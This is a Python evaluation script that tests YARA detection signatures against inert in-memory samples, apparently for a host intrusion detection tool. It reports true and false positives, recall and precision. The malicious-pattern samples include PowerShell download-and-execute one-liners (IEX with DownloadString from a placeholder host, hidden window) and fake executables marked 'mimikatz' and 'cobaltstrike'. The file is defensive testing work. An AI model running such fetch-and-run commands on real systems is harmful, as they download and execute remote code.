"""In-memory YARA sanity check, including known false-positive cases.

Run from the project folder:
    .\\.venv\\Scripts\\python.exe eval_yara.py

All samples are inert bytes held in memory. Nothing is written to disk or
executed. These hand-authored samples are not a real-world accuracy measure.
"""

import yara
from signatures import FILE_SIGNATURES


rules = yara.compile(source=FILE_SIGNATURES)

# (name, content_bytes, expected_malicious_pattern)
SAMPLES = [
    # Malicious-pattern samples: expected to match.
    (
        "mal_01 IEX + DownloadString (like test.ps1)",
        b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\"",
        True,
    ),
    (
        "mal_02 Invoke-Expression + DownloadString",
        b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.invalid/b')",
        True,
    ),
    (
        "mal_03 Base64 decode + hidden window",
        b"powershell -WindowStyle Hidden -c [Convert]::FromBase64String($x)",
        True,
    ),
    (
        "mal_04 IEX + DownloadString, no 'powershell' word",
        b"IEX ((New-Object Net.WebClient).DownloadString('http://example.invalid/c'))",
        True,
    ),
    ("mal_05 fake EXE with 'mimikatz' marker", b"MZ" + b"\x00" * 60 + b"mimikatz", True),
    ("mal_06 fake EXE with 'cobaltstrike' marker", b"MZ" + b"\x00" * 60 + b"cobaltstrike", True),
    # Benign samples: expected not to match.
    ("ben_01 simple Write-Host script", b'Write-Host "hello world"', False),
    ("ben_02 backup script (Copy-Item)", b"Copy-Item C:\\data D:\\backup -Recurse", False),
    (
        "ben_03 mentions powershell in a comment only",
        b"# run this with powershell as admin\nGet-Process",
        False,
    ),
    (
        "ben_04 downloads a file (DownloadFile, not DownloadString)",
        b"(New-Object Net.WebClient).DownloadFile('https://example.com/x.zip','x.zip')",
        False,
    ),
    ("ben_05 decodes a base64 config, no hidden window", b"$cfg=[Convert]::FromBase64String($s)", False),
    ("ben_06 batch file", b"@echo off\r\necho hello\r\npause", False),
    ("ben_07 python script", b"import os\nprint(os.getcwd())", False),
    (
        "ben_08 normal EXE (MZ, no markers)",
        b"MZ" + b"\x00" * 200 + b"This program cannot be run in DOS mode",
        False,
    ),
    # Deliberate weak spots: benign admin/app data that can match broad strings.
    (
        "ben_09 Chocolatey-style installer (legit iex + DownloadString)",
        b"Set-ExecutionPolicy Bypass -Scope Process -Force; "
        b"iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/install.ps1'))",
        False,
    ),
    (
        "ben_10 legit game EXE containing the word 'Empires'",
        b"MZ" + b"\x00" * 60 + b"Age of Empires Launcher",
        False,
    ),
]

true_positive = false_positive = false_negative = true_negative = 0
print(f"{'RESULT':<6} {'SAMPLE':<62} MATCHED RULES")
print("-" * 110)
for name, data, expected_malicious in SAMPLES:
    matched_rules = [match.rule for match in rules.match(data=data)]
    flagged = bool(matched_rules)
    if expected_malicious and flagged:
        result = "TP"
        true_positive += 1
    elif expected_malicious:
        result = "FN"
        false_negative += 1
    elif flagged:
        result = "FP"
        false_positive += 1
    else:
        result = "TN"
        true_negative += 1
    print(f"{result:<6} {name:<62} {matched_rules if matched_rules else '-'}")

total = true_positive + false_positive + false_negative + true_negative
recall = true_positive / (true_positive + false_negative) if true_positive + false_negative else 0
precision = true_positive / (true_positive + false_positive) if true_positive + false_positive else 0
false_positive_rate = false_positive / (false_positive + true_negative) if false_positive + true_negative else 0
accuracy = (true_positive + true_negative) / total if total else 0

print("\n===== SUMMARY =====")
print(
    f"Samples: {total} | TP={true_positive} FN={false_negative} "
    f"FP={false_positive} TN={true_negative}"
)
print(f"Detection rate (recall)  : {recall:.0%}")
print(f"Precision                : {precision:.0%}")
print(f"False-positive rate      : {false_positive_rate:.0%}")
print(f"Accuracy                 : {accuracy:.0%}")
print("\nNote: this is a small, hand-made sanity-check set only.")
print("These percentages do not represent real-world HIDS accuracy.")
